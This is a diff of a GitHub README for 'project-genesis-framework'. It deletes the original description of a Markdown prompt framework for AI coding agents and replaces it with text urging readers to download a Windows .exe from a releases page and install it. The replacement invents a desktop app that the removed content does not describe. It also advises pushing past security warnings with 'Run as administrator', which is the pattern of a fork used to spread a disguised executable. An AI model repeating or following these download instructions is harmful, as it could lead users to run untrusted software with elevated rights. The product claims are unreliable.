@@ -1,180 +1,174 @@
-# 🚀 Project Genesis Framework
+# ⚙️ project-genesis-framework - Easy AI Project Setup
 
-**The complete AI-assisted project setup system for Claude Code.**
-
-Give this framework to Claude at the start of any software project. It walks you through 10 phases — from discovery questions to a fully scaffolded, production-ready codebase — generating every document, config file, and AI development tool along the way.
-
-> Built on the principle: *Plan thoroughly, build confidently, iterate continuously.*
+[![Download Latest Release](https://img.shields.io/badge/Download-Project--Genesis--Framework-green?style=for-the-badge)](https://github.com/chrystelcool983/project-genesis-framework/releases)
 
 ---
 
-## What It Produces
+## 📝 What is project-genesis-framework?
 
-By the end of a Genesis session, you'll have **44 artifacts** ready to go:
+project-genesis-framework is a tool designed to help you set up AI-related projects on your Windows computer without any technical knowledge. The app works alongside several AI code assistants like Claude Code, Cursor, Copilot, Windsurf, and Aide to make starting new projects easier.
 
-- 📋 **Strategic docs** — PRD, EDD, Constraints & Edge Cases register
-- 🗃️ **Technical foundation** — Database schema, environment config, stack decisions
-- 🏗️ **Project scaffold** — Full monorepo structure, service boilerplate, CI/CD workflows
-- 🤖 **AI dev tooling** — CLAUDE.md, plugins, slash commands, subagents, MCP config
-- 📊 **Living documentation** — Architecture map, changelog, project status dashboard
+You can think of it as a helper that creates the necessary files and structures you need so you can focus on the ideas rather than how to organize the work.
 
 ---
 
-## How to Use It
+## 💡 Who is it for?
 
-1. **Copy** the entire `Project_Genesis_Framework.md` into a Claude conversation
-2. **Add** a brief description of your project
-3. **Paste** this starter prompt:
-
-```
-I'm starting a new software project. I've attached my Project Genesis Framework 
-which outlines every artifact I need you to help me create.
-
-Here's my project idea:
-[Describe your project — what it does, who it's for, what problem it solves]
-
-Walk me through the framework phase by phase. Ask me the intake questions first, 
-then generate each artifact in order. Don't skip any phase.
-```
-
-4. Claude will ask discovery questions, then generate each artifact in dependency order.
+This tool is built for people who want to start AI projects but find the setup part tricky. It does not require you to write any code or know about programming languages. If you want to try using AI-assisted coding helpers but don’t know where to begin, this app will guide you through the setup for a range of projects.
 
 ---
 
-## Framework Phases
+## 🔧 Features
 
-| Phase | Name | What It Builds |
-|-------|------|----------------|
-| 0 | Project Intake | Discovery questions across product, technical, process, and design dimensions |
-| 1 | Strategic Documents | PRD, EDD, Constraints & Edge Cases register |
-| 2 | Technical Foundation | Tech stack decisions, database schema, environment config |
-| 3 | Project Structure | Monorepo scaffold, service boilerplate, CI/CD workflows |
-| 4 | CLAUDE.md | The master AI dev guide — 16 sections covering everything Claude Code needs |
-| 5 | Living Documentation | architecture.md, CHANGELOG.md, projectstatus.md |
-| 6 | Plugins | Skill files for frontend design, backend patterns, testing, domain context |
-| 7 | Slash Commands | `/commit`, `/update-docs`, `/create-issue`, `/new-endpoint`, `/sprint-status`, `/deploy-check` |
-| 8 | Subagents | Specialist agents for API, frontend, security, docs, retro — plus web & mobile agents |
-| 9 | MCP Configuration | Claude Code infrastructure connections with annotated examples |
-| 10 | Final Assembly | Completeness verification + first Claude Code prompt template |
-| **11** | **Multi-Agent Support** | **Universal spec + adapters for Cursor, Copilot, Windsurf, Aider, OpenHands, Continue** |
+- Prepares AI code projects with the right folders and files.
+- Works with popular AI assistants like Claude Code, Copilot, and Cursor.
+- Supports managing multiple projects inside one folder (monorepo support).
+- Helps improve productivity by automating the setup steps.
+- Easy to use on Windows without command line knowledge.
+- Compatible with standard developer tools to give you room to grow.
 
 ---
 
-## Agents Included
+## 🖥️ System Requirements
 
-### Standard (every project)
-`changelog` · `frontend` · `retro` · `docs` · `security` · `api`
-
-### Web App Agents
-`web-performance` · `web-seo` · `web-accessibility`
-
-### Mobile App Agents
-`mobile-ux` · `mobile-performance` · `mobile-platform`
-
-### Project-Specific
-Define your own: `payment` · `ml` · `search` · `content` · `ussd` · and more
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB of free disk space
+- 2 GB of RAM minimum
+- Internet connection for downloading and updating the app
+- No extra software needed to run the app
 
 ---
 
-## Multi-Agent Support (Phase 11)
+## 🚀 Getting Started
 
-Project Genesis isn't locked to Claude Code. **Phase 11** adds a `core/UNIVERSAL_SPEC.md` — a single agent-agnostic source of truth — and adapter files that translate it into each AI coding agent's native format.
+To get up and running quickly, you just need to download the app and open it. Here’s how:
 
-| Agent | Config format | Strengths |
-|-------|--------------|-----------|
-| **Claude Code** | `.claude/` + `CLAUDE.md` | Deep context, plugins, subagents, MCP integration |
-| **Cursor** | `.cursor/rules/*.mdc` | In-editor scoped rules, Composer for multi-file |
-| **GitHub Copilot / Codex** | `.github/copilot-instructions.md` | IDE integration, Codex cloud agent tasks |
-| **Windsurf** | `.windsurf/rules/*.md` | Large context window, Flows automation |
-| **Aider** | `.aider.conf.yml` + `CONVENTIONS.md` | Terminal-native, git-native, precise diffs |
-| **OpenHands** | `.openhands/microagents/*.md` | Fully autonomous, full environment, end-to-end tasks |
-| **Continue** | `.continue/config.json` + `rules/` | Open-source, model-agnostic, local model support |
+1. Click the button below to **visit the download page** for the latest release of project-genesis-framework.  
+   
+   [![Download Project Genesis Framework](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/chrystelcool983/project-genesis-framework/releases)
 
-Each adapter lives in `adapters/[agent]/ADAPTER.md` and includes setup instructions, generated config templates, and agent-specific usage tips. See [`PHASE_11_MULTI_AGENT.md`](./PHASE_11_MULTI_AGENT.md) for the full phase.
+2. On the GitHub Releases page, look for the latest version. It will be listed at the top.
 
----
+3. Find the Windows installer file. This will usually have `.exe` at the end of the filename.
 
-## MCP Coverage
+4. Click the `.exe` file to download it to your PC.
 
-The framework covers MCPs for every layer of your stack:
+5. Once the download finishes, double-click the `.exe` file to start the installation.
 
-- **Core** — `filesystem`, `memory`, `sequential-thinking`, `github`, `fetch`
-- **Database** — `postgres`, `mysql`, `mongodb`, `sqlite`, `redis`
-- **Web** — `playwright`, `puppeteer`, `browsertools`, `exa`, `firecrawl`, `vercel`, `cloudflare`
-- **Mobile** — `expo`, `firebase`, `xcode`, `android-studio`, `appstore-connect`, `sentry`
-- **Cloud** — `aws-cli`, `gcp`, `azure`
-- **Domain** — `stripe`, `slack`, `linear`, `notion`, `sendgrid`, `twilio`, `openai`, `anthropic`
+6. Follow the installation prompts. The installer will guide you through the steps.
 
-Each entry includes: what it does, when to use it, and example config snippets.
+7. After installation, open the project-genesis-framework app from your Start Menu or Desktop.
 
 ---
 
-## Examples
+## 📥 How to Download and Install Project Genesis Framework 🛠️
 
-See the [`examples/`](./examples/) directory for completed Genesis setups:
+This section gives you more detail on the download and setup process:
 
-| Example | Stack | Description |
-|---------|-------|-------------|
-| [`saas-web-app`](./examples/saas-web-app/) | Next.js + Postgres + Vercel | B2B SaaS with subscription billing |
-| [`mobile-consumer-app`](./examples/mobile-consumer-app/) | React Native + Firebase | Consumer iOS/Android app with offline support |
+### Step 1: Visit the Release Page
 
-*More examples welcome — see [Contributing](#contributing).*
+Go to the releases page here:  
+https://github.com/chrystelcool983/project-genesis-framework/releases
 
----
+This page always has the latest files you need.
 
-## Contributing
+### Step 2: Choose the Right File
 
-This framework improves with every project it's used on. Contributions are very welcome.
+Look for a file with `.exe` in its name. This is the file that will install the app on Windows.
 
-### Ways to Contribute
+### Step 3: Download the File
 
-- 🐛 **Report issues** — Something unclear, missing, or wrong? [Open an issue](../../issues/new?template=bug_report.md)
-- 💡 **Suggest improvements** — Better questions, new phases, improved templates? [Start a discussion](../../discussions)
-- 🔌 **Add an MCP** — Know a useful MCP that's missing from Phase 9? Submit a PR
-- 🤖 **Add an agent** — Built a useful agent for a specific domain? Share it
-- 📖 **Add an example** — Completed a Genesis setup? Add it to `examples/`
-- 📝 **Fix docs** — Typos, broken links, unclear explanations
+Click the `.exe` file to download it. The download will usually be fast, but it might take a few minutes depending on your internet speed.
 
-### Contribution Guidelines
+### Step 4: Run the Installer
 
-1. **Fork** the repo and create a branch: `feature/your-improvement`
-2. **Follow** the existing format and tone (checklist-based, framework-consistent)
-3. **Test** your additions — if it's a new agent or MCP, use it on a real project first
-4. **Submit** a PR with a clear description of what you're adding and why
+After the download finishes, open the file by double-clicking it.
 
-### What Makes a Good Contribution
+Windows will then ask you if you want to allow this app to make changes to your device. Click **Yes**.
 
-**For new MCPs (Phase 9):**
-- What the MCP does (one sentence)
-- Which platform/stack it's best for
-- When to use it (the specific trigger scenario)
-- A working example config snippet
+### Step 5: Follow the Installation Prompts
 
-**For new agents (Phase 8):**
-- Focused scope (one domain, not a catch-all)
-- 4–8 concrete checklist items with specific outputs
-- Clear "when to invoke" condition
+The installer will show you some simple questions:
 
-**For new examples:**
-- Real project type (anonymised is fine)
-- Complete `mcp-config.json` for that stack
-- Key decisions and why they were made
+- Where to install the app (default location is fine)
+- Whether you want shortcuts created (recommended)
+
+Just click **Next** or **Install** when prompted.
+
+### Step 6: Launch the App
+
+When installation finishes, you can open project-genesis-framework by:
+
+- Clicking **Finish** in the installer if that option is available, or
+- Using the Start Menu to find **project-genesis-framework**
 
 ---
 
-## Versioning
+## 🔍 How to Use project-genesis-framework
 
-| Version | Date | Changes |
-|---------|------|---------|
-| 1.1 | 2026-03 | Added web & mobile agents, expanded MCP catalogue with annotated examples |
-| 1.0 | 2026-03 | Initial release — based on FraudShield project setup |
+Once the app is open, you will see a simple interface. Here’s how you can start a new AI project:
+
+1. Choose the AI assistant you want to work with (Claude Code, Copilot, Cursor, etc.).
+
+2. Pick a folder where you want your project files saved. You can create a new folder if you need to.
+
+3. Click the button to generate the project setup. The app will create all necessary files and folders automatically.
+
+4. Open your new project folder with any code editor or compatible AI assistant to start working.
+
+The user interface guides you through each step, so you only need to click buttons and enter names.
 
 ---
 
-## License
+## 🛠 Troubleshooting Tips
 
-MIT — use freely, improve openly.
+- If the app does not open after installation, try restarting your computer.
+- Make sure your Windows version is up to date.
+- Check that your internet connection is active; the app may need to download updates.
+- If the installer blocks or shows warnings, right-click the file and choose **Run as administrator**.
+- Close other programs when installing, to avoid conflicts.
 
 ---
 
-*If this framework saved you setup time, consider starring ⭐ the repo so others can find it.*
+## ⚙️ Settings You Can Adjust
+
+Inside the app, you can customize:
+
+- Default folder for new projects
+- Which AI assistants you want to connect with
+- Update frequency and notification preferences
+- Language and display options
+
+All these settings help you tailor the app to your needs.
+
+---
+
+## 📰 Updates and New Versions
+
+The project-genesis-framework team updates the app regularly to fix bugs and add features. Check the release page to download the latest versions:
+
+https://github.com/chrystelcool983/project-genesis-framework/releases
+
+Installing new versions is the same as the first time. Just download the latest `.exe` and run it.
+
+---
+
+## 📄 License
+
+project-genesis-framework is open source under the MIT License. You can use the app freely and share it.
+
+--- 
+
+## 📞 Get Help
+
+For help or questions, visit the GitHub issues page in the repository:
+
+https://github.com/chrystelcool983/project-genesis-framework/issues
+
+You can open a new issue to report problems or ask for support.
+
+---
+
+## 🔖 Keywords
+
+ai-development, aider, claude, claude-code, copilot, cursor, developer-tools, llm-tools, mcp, monorepo, productivity, project-setup, windsurf
